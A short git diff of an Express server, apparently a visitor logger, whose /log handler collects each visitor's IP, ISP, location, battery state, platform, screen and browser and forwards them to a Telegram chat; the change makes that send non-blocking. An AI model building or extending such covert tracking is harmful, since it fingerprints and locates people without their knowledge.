@@ -79,18 +79,21 @@ app.post('/log', async (req, res) => {
 \x1b[36m═════════════════════════════════════════════════════════════\x1b[0m
 `;
 
-    // ✅ Show in Render logs
+    // ✅ Always log to Render
     console.log(log);
 
-    // ✅ Send to Telegram
-    await sendToTelegram(`*New Visitor Logged:*
+    // ✅ Telegram alert — non-blocking
+    sendToTelegram(`*New Visitor Logged:*
 *IP:* ${ip}
 *ISP:* ${ispInfo}
 *Location:* ${city}, ${country}
 *Battery:* ${clientData.battery?.level} (${clientData.battery?.charging})
 *Platform:* ${clientData.platform}
 *Screen:* ${clientData.screen}
-*Browser:* ${clientData.browserInfo}`);
+*Browser:* ${clientData.browserInfo}`)
+    .catch(err => {
+        console.error('Telegram error:', err.message);
+    });
 
     res.json({ status: 'logged' });
 });
@@ -106,3 +109,4 @@ app.get('/go', (req, res) => {
 app.listen(PORT, () => {
     console.log(`✅ Server running on http://localhost:${PORT}`);
 });
+    
